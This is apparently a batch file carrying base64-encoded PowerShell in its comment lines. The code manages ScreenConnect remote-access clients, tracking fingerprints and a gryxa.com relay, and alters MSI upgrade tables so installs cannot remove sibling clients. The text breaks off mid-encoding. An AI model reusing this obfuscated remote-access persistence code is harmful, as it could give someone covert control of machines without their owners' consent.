::ZT4NCidADQoNCmZ1bmN0aW9uIEdldC1Hcnl4YUNmZ1BhdGggeyBKb2luLVBhdGgg
::JFdvcmtEaXIgJ2dyeXhhLmNmZycgfQ0KZnVuY3Rpb24gR2V0LVNldnJ6Q2ZnUGF0
::aCB7IEpvaW4tUGF0aCAkV29ya0RpciAnc2V2cnouY2ZnJyB9DQoNCmZ1bmN0aW9u
::IEdldC1TZXZyektlZXAgew0KICAgICRwcmltID0gJHNjcmlwdDpTZXZyekRlZmF1
::bHRQcmltYXJ5DQogICAgJGFsdCA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0DQog
::ICAgJHAgPSBHZXQtU2V2cnpDZmdQYXRoDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
::ICRwIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
::Y3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlBSSU1BUllfRlA9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeQUxUX0ZQPShbMC05
::YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIo
::KSB9DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfUFJJTUFS
::WT0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRwcmltID0gJG1hdGNoZXNbMV0u
::VG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15FWFBFQ1RF
::RF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNb
::MV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHByaW0sICRhbHQpDQogICAgcmV0dXJuIEAoJHByaW0sICRh
::bHQpDQp9DQoNCmZ1bmN0aW9uIFNldC1TZXZyekZwKFtzdHJpbmddJFByaW1hcnks
::IFtzdHJpbmddJEFsdCkgew0KICAgIGlmICgtbm90ICRQcmltYXJ5KSB7ICRQcmlt
::YXJ5ID0gJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5IH0NCiAgICBpZiAoLW5v
::dCAkQWx0KSB7ICRBbHQgPSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdCB9DQogICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7IE5l
::dy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNl
::IHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJQUklNQVJZX0ZQPSQoJFBy
::aW1hcnkuVG9Mb3dlcigpKSIsDQogICAgICAgICJBTFRfRlA9JCgkQWx0LlRvTG93
::ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfUFJJTUFSWT0kKCRQcmltYXJ5LlRv
::TG93ZXIoKSkiLA0KICAgICAgICAiRVhQRUNURURfQUxUPSQoJEFsdC5Ub0xvd2Vy
::KCkpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVyc2Fs
::VGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29udGVudCAtTGl0
::ZXJhbFBhdGggKEdldC1TZXZyekNmZ1BhdGgpIC1FbmNvZGluZyBBU0NJSSAtRm9y
::Y2UNCiAgICAkc2NyaXB0OlNldnJ6S2VlcCA9IEAoJFByaW1hcnkuVG9Mb3dlcigp
::LCAkQWx0LlRvTG93ZXIoKSkNCn0NCg0KZnVuY3Rpb24gU3luYy1TZXZyekV4cGVj
::dGVkKFtzdHJpbmddJEV4cGVjdGVkVGV4dCkgew0KICAgICMgQXBwbHkgcmVwbyBz
::ZXZyel9leHBlY3RlZC5jZmcgYm9keSAoRVhQRUNURURfUFJJTUFSWT0vRVhQRUNU
::RURfQUxUPSBsaW5lcykNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwN
::CiAgICBmb3JlYWNoICgkbGluZSBpbiAoJEV4cGVjdGVkVGV4dCAtc3BsaXQgImBy
::P2BuIikpIHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX1BS
::SU1BUlk9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKSB9DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBF
::Q1RFRF9BTFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNo
::ZXNbMV0uVG9Mb3dlcigpIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJHByaW0pIHsg
::JHByaW0gPSAoR2V0LVNldnJ6S2VlcClbMF0gfQ0KICAgIGlmICgtbm90ICRhbHQp
::IHsgJGFsdCA9IChHZXQtU2V2cnpLZWVwKVsxXSB9DQogICAgU2V0LVNldnJ6RnAg
::JHByaW0gJGFsdA0KICAgIHJldHVybiAiU0VWUlp8JHByaW18JGFsdCINCn0NCg0K
::ZnVuY3Rpb24gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZShbc3RyaW5nXSRNc2lQYXRo
::KSB7DQogICAgIyBMNDAvTDQ0OiBjb3B5IE1TSSBhbmQgREVMRVRFIEZST00gVXBn
::cmFkZSBzbyAvaSBjYW5ub3QgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBzaWJsaW5n
::cy4NCiAgICAjIEw0NDogdmVyaWZ5IFVwZ3JhZGUgaXMgZW1wdHkgYWZ0ZXIgREVM
::RVRFIOKAlCBuZXZlciByZXR1cm4gYSBzdGlsbC1kYW5nZXJvdXMgTVNJLg0KICAg
::IGlmICgtbm90ICRNc2lQYXRoIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQ
::YXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgICRzYWZlID0gSm9p
::bi1QYXRoICRlbnY6VEVNUCAoInNjX3NhZmVfezB9Lm1zaSIgLWYgW2d1aWRdOjpO
::ZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkNCiAgICB0cnkgew0KICAgICAgICBDb3B5
::LUl0ZW0gLUxpdGVyYWxQYXRoICRNc2lQYXRoIC1EZXN0aW5hdGlvbiAkc2FmZSAt
::Rm9yY2UNCiAgICAgICAgJGkgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93
::c0luc3RhbGxlci5JbnN0YWxsZXINCiAgICAgICAgJGRiID0gJGkuT3BlbkRhdGFi
::YXNlKChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKS5QYXRoLCAxKQ0K
::ICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHYgPSAkZGIuT3BlblZpZXcoJ0RF
::TEVURSBGUk9NIGBVcGdyYWRlYCcpDQogICAgICAgICAgICAkdi5FeGVjdXRlKCkg
::fCBPdXQtTnVsbA0KICAgICAgICAgICAgJGRiLkNvbW1pdCgpDQogICAgICAgIH0g
::Y2F0Y2ggew0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRz
::YWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
::ICAgICAgcmV0dXJuICRudWxsDQogICAgICAgIH0NCiAgICAgICAgIyB2ZXJpZnkg
::ZW1wdHkNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRkYjIgPSAkaS5PcGVu
::RGF0YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJHNhZmUpLlBhdGgs
::IDApDQogICAgICAgICAgICAkYyA9ICRkYjIuT3BlblZpZXcoJ1NFTEVDVCBgVXBn
::cmFkZUNvZGVgIEZST00gYFVwZ3JhZGVgJykNCiAgICAgICAgICAgICRjLkV4ZWN1
::dGUoKSB8IE91dC1OdWxsDQogICAgICAgICAgICBpZiAoJGMuRmV0Y2goKSkgew0K
::ICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkc2FmZSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::ICAgICByZXR1cm4gJG51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRj
::aCB7DQogICAgICAgICAgICAjIG1pc3NpbmcgVXBncmFkZSB0YWJsZSA9IGFscmVh
::ZHkgc2FmZQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkc2FmZQ0KICAgIH0g
::Y2F0Y2ggew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkc2Fm
::ZSkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgcmV0dXJuICRudWxs
::DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVVwZGF0ZU1hbmlmZXN0KFtzdHJp
::bmddJE1hbmlmZXN0UGF0aCwgW3N0cmluZ10kU2lnUGF0aCwgW2hhc2h0YWJsZV0k
::RmlsZU1hcCkgew0KICAgICMgVmVyaWZ5IFJTQS1TSEEyNTYgc2lnbmF0dXJlIG92
::ZXIgdXBkYXRlLm1hbmlmZXN0LCB0aGVuIFNIQTI1NiBvZiBlYWNoIHN0YWdlZCBm
::aWxlLg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNYW5p
::ZmVzdFBhdGgpIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRTaWdQ
::YXRoKSkgeyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBpZiAoLW5vdCAkc2NyaXB0
::OlVwZGF0ZVB1YktleVhtbCAtb3IgJHNjcmlwdDpVcGRhdGVQdWJLZXlYbWwgLW1h
::dGNoICdQTEFDRUhPTERFUicpIHsgcmV0dXJuICduby1wdWJrZXknIH0NCiAgICB0
::cnkgew0KICAgICAgICAkYnl0ZXMgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygo
::UmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQYXRoKS5QYXRoKQ0K
::ICAgICAgICAkc2lnID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChbSU8u
::RmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRT
::aWdQYXRoKS5QYXRoKS5UcmltKCkpKQ0KICAgICAgICAkcnNhID0gW1N5c3RlbS5T
::ZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBXTo6Q3JlYXRlKCkNCiAgICAgICAgJHJz
::YS5Gcm9tWG1sU3RyaW5nKCRzY3JpcHQ6VXBkYXRlUHViS2V5WG1sKQ0KICAgICAg
::ICBpZiAoLW5vdCAkcnNhLlZlcmlmeURhdGEoJGJ5dGVzLCAkc2lnLCBbU3lzdGVt
::LlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1
::NiwgW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBU2lnbmF0dXJlUGFk
::ZGluZ106OlBrY3MxKSkgew0KICAgICAgICAgICAgcmV0dXJuICdiYWQtc2lnJw0K
::ICAgICAgICB9DQogICAgICAgICRkb2MgPSBHZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJE1hbmlmZXN0UGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAg
::ICBmb3JlYWNoICgkbmFtZSBpbiAkRmlsZU1hcC5LZXlzKSB7DQogICAgICAgICAg
::ICAkcGF0aCA9ICRGaWxlTWFwWyRuYW1lXQ0KICAgICAgICAgICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHBhdGgpKSB7IHJldHVybiAibWlzc2lu
::Zy1maWxlOiRuYW1lIiB9DQogICAgICAgICAgICAkd2FudCA9IFtzdHJpbmddJGRv
::Yy5maWxlcy4kbmFtZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHdhbnQpIHsgcmV0
::dXJuICJub3QtaW4tbWFuaWZlc3Q6JG5hbWUiIH0NCiAgICAgICAgICAgICRzaGEg
::PSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUo
::KQ0KICAgICAgICAgICAgJGZzID0gW0lPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2
::ZS1QYXRoIC1MaXRlcmFsUGF0aCAkcGF0aCkuUGF0aCkNCiAgICAgICAgICAgIHRy
::eSB7ICRoYXNoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkc2hhLkNvbXB1
::dGVIYXNoKCRmcykpKS5SZXBsYWNlKCctJywgJycpLlRvTG93ZXIoKSB9DQogICAg
::ICAgICAgICBmaW5hbGx5IHsgJGZzLkNsb3NlKCkgfQ0KICAgICAgICAgICAgaWYg
::KCRoYXNoIC1uZSAkd2FudC5Ub0xvd2VyKCkpIHsgcmV0dXJuICJoYXNoLW1pc21h
::dGNoOiRuYW1lIiB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICdvaycNCiAg
::ICB9IGNhdGNoIHsgcmV0dXJuICJlcnJvcjokKCRfLkV4Y2VwdGlvbi5NZXNzYWdl
::KSIgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFGcCB7DQogICAgJGZwID0gJHNj
::cmlwdDpHcnl4YURlZmF1bHRGcA0KICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0aA0K
::ICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSB7DQogICAgICAgIEdl
::dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgkXyAt
::bWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZw
::ID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAg
::ICByZXR1cm4gJGZwDQp9DQoNCmZ1bmN0aW9uIFNldC1Hcnl4YUZwKFtzdHJpbmdd
::JEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJl
::dHVybiB9DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdv
::cmtEaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdv
::cmtEaXIgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgIEAoDQogICAgICAgICJDVVJS
::RU5UX0ZQPSQoJEZpbmdlcnByaW50LlRvTG93ZXIoKSkiLA0KICAgICAgICAiUkVM
::QVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlIb3N0KSIsDQogICAgICAgICJVST0kKCRz
::Y3JpcHQ6R3J5eGFVaUhvc3QpIiwNCiAgICAgICAgIk1TSVVSTD0kKCRzY3JpcHQ6
::R3J5eGFNc2lVcmwpIiwNCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRv
::VW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggKEdldC1Hcnl4YUNmZ1BhdGgpIC1FbmNvZGluZyBB
::U0NJSSAtRm9yY2UNCn0NCg0KIyBMMzk6IG5ldmVyIGFkb3B0IGEgZm9yZWlnbiBT
::QyBhcyBHcnl4YS4gS2VlcGVyIG9ubHkgaWYgRlAgaXMgRXhwZWN0ZWRGcCBPUg0K
::IyBJbWFnZVBhdGgvY21kbGluZSBjb250YWlucyBncnl4YS5jb20gKG9yIGNmZyBS
::RUxBWSBob3N0KS4gRG8gTk9UIHRydXN0IGNmZyBhbG9uZSDigJQNCiMgYSBwb2lz
::b25lZCBDVVJSRU5UX0ZQIHdvdWxkIHNlbGYtd2hpdGVsaXN0IGZvcmV2ZXIuDQpm
::dW5jdGlvbiBUZXN0LUlzR3J5eGFGcChbc3RyaW5nXSRGcCkgew0KICAgIGlmICgt
::bm90ICRGcCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkZnAgPSAkRnAuVG9Mb3dl
::cigpDQogICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpTZXZyektlZXApIHsgcmV0dXJu
::ICRmYWxzZSB9DQogICAgaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIC1hbmQg
::JGZwIC1lcSAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JGZwKSINCiAgICAkaW1nID0gW3N0cmluZ10oR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtM
::TTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCRuYW1lIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgJHJlbGF5
::ID0gJHNjcmlwdDpHcnl4YVJlbGF5SG9zdA0KICAgIGlmICgkaW1nIC1hbmQgKCRp
::bWcgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkaW1n
::IC1saWtlICIqJHJlbGF5KiIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGZvcmVh
::Y2ggKCRwcm9jIGluIChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmls
::dGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgICRibG9iID0gIiQoW3N0cmluZ10k
::cHJvYy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRwcm9jLkNvbW1hbmRMaW5l
::KSINCiAgICAgICAgaWYgKCRibG9iIC1saWtlICIqJGZwKiIgLWFuZCAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkYmxvYiAt
::bGlrZSAiKiRyZWxheSoiKSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0K
::ICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rp
::b24gR2V0LUtlZXBGaW5nZXJwcmludHMgew0KICAgICRzZXQgPSBOZXctT2JqZWN0
::ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5IYXNoU2V0W3N0cmluZ10nIChb
::U3RyaW5nQ29tcGFyZXJdOjpPcmRpbmFsSWdub3JlQ2FzZSkNCiAgICBmb3JlYWNo
::ICgkcyBpbiAoR2V0LVNldnJ6S2VlcCkpIHsgW3ZvaWRdJHNldC5BZGQoJHMpIH0N
::CiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgW3ZvaWRdJHNldC5B
::ZGQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIH0NCiAgICAkY2ZnID0gR2V0LUdy
::eXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChUZXN0LUlzR3J5eGFGcCAkY2ZnKSkg
::eyBbdm9pZF0kc2V0LkFkZCgkY2ZnKSB9DQogICAgZWxzZWlmICgkc2NyaXB0Okdy
::eXhhRXhwZWN0ZWRGcCkgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0OkdyeXhhRXhw
::ZWN0ZWRGcCkgfQ0KICAgIGVsc2UgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0Okdy
::eXhhRGVmYXVsdEZwKSB9DQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZp
::Y2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90
::aW4gQCgnUnVubmluZycsJ1N0YXJ0UGVuZGluZycsJ0NvbnRpbnVlUGVuZGluZycp
::KSB7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1wo
::KFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpT
::ZXZyektlZXApIHsgY29udGludWUgfQ0KICAgICAgICAgICAgaWYgKFRlc3QtSXNH
::cnl4YUZwICRmcCkgeyBbdm9pZF0kc2V0LkFkZCgkZnApOyBTZXQtR3J5eGFGcCAk
::ZnAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBAKCRzZXQpDQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtVGNwSG9zdFBvcnQoW3N0cmluZ10kSG9zdE5hbWUsIFtp
::bnRdJFBvcnQgPSA0NDMsIFtpbnRdJFRpbWVvdXRNcyA9IDgwMDApIHsNCiAgICBp
::ZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJGMgPSAk
::bnVsbA0KICAgIHRyeSB7DQogICAgICAgICRjID0gTmV3LU9iamVjdCBTeXN0ZW0u
::TmV0LlNvY2tldHMuVGNwQ2xpZW50DQogICAgICAgICRpYXIgPSAkYy5CZWdpbkNv
::bm5lY3QoJEhvc3ROYW1lLCAkUG9ydCwgJG51bGwsICRudWxsKQ0KICAgICAgICBp
::ZiAoLW5vdCAkaWFyLkFzeW5jV2FpdEhhbmRsZS5XYWl0T25lKCRUaW1lb3V0TXMs
::ICRmYWxzZSkpIHsgdHJ5IHsgJGMuQ2xvc2UoKSB9IGNhdGNoIHt9OyByZXR1cm4g
::JGZhbHNlIH0NCiAgICAgICAgJGMuRW5kQ29ubmVjdCgkaWFyKTsgcmV0dXJuICR0
::cnVlDQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfSBmaW5hbGx5IHsgaWYg
::KCRjKSB7IHRyeSB7ICRjLkNsb3NlKCkgfSBjYXRjaCB7fSB9IH0NCn0NCg0KZnVu
::Y3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmdd
::JFByb3BlcnR5TmFtZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgIHRyeSB7DQog
::ICAgICAgICRpID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxs
::ZXIuSW5zdGFsbGVyDQogICAgICAgICRkYiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVz
::b2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkNCiAgICAg
::ICAgJHYgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVgIEZST00gYFByb3Bl
::cnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpDQogICAgICAg
::ICR2LkV4ZWN1dGUoKSB8IE91dC1OdWxsDQogICAgICAgICRyID0gJHYuRmV0Y2go
::KQ0KICAgICAgICBpZiAoLW5vdCAkcikgeyByZXR1cm4gJG51bGwgfQ0KICAgICAg
::ICByZXR1cm4gW3N0cmluZ10kci5TdHJpbmdEYXRhKDEpDQogICAgfSBjYXRjaCB7
::IHJldHVybiAkbnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0
::TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgew0KICAgIGlmICgkUHJvZHVjdE5h
::bWUgLW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5j
::dGlvbiBGaW5kLVByb2R1Y3RHdWlkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAka2V5LlBTQ2hpbGROYW1lIH0NCiAg
::ICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVuY3Rpb24g
::R2V0LVNjSW1hZ2VQYXRoKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYg
::KC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnJyB9DQogICAgJHAgPSAiSEtM
::TTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIHRyeSB7DQogICAgICAgIHJl
::dHVybiBbc3RyaW5nXShHZXQtSXRlbVByb3BlcnR5IC1MaXRlcmFsUGF0aCAkcCAt
::TmFtZSBJbWFnZVBhdGggLUVycm9yQWN0aW9uIFN0b3ApLkltYWdlUGF0aA0KICAg
::IH0gY2F0Y2ggeyByZXR1cm4gJycgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjSGFz
::R3J5eGFSZWxheShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICRpbWcgPSBH
::ZXQtU2NJbWFnZVBhdGggJEZpbmdlcnByaW50DQogICAgcmV0dXJuIFtib29sXSgk
::aW1nIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKQ0KfQ0KDQpmdW5jdGlvbiBUZXN0
::LVNjUnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDQ4OiBz
::Yy5leGUgKyByZXF1aXJlIHJ1bm5pbmcgc3RhdGUNCiAgICBpZiAoLW5vdCAkRmlu
::Z2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJG91dCA9ICYgc2MuZXhl
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgMj4m
::MSB8IE91dC1TdHJpbmcNCiAgICByZXR1cm4gW2Jvb2xdKCRvdXQgLW1hdGNoICco
::P2kpU1RBVEVccyo6XHMqXGQrXHMrKFJVTk5JTkd8U1RBUlRfUEVORElOR3xDT05U
::SU5VRV9QRU5ESU5HKScpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtU2NTZXJ2aWNlRXhp
::c3RzKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdl
::cnByaW50KSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICYgc2MuZXhlIHF1ZXJ5ICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgMj4mMSB8IE91dC1O
::dWxsDQogICAgcmV0dXJuICgkTEFTVEVYSVRDT0RFIC1lcSAwKQ0KfQ0KDQpmdW5j
::dGlvbiBUZXN0LVNjRGlyKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgZm9y
::ZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6
::UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFs
::UGF0aCAoSm9pbi1QYXRoICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZp
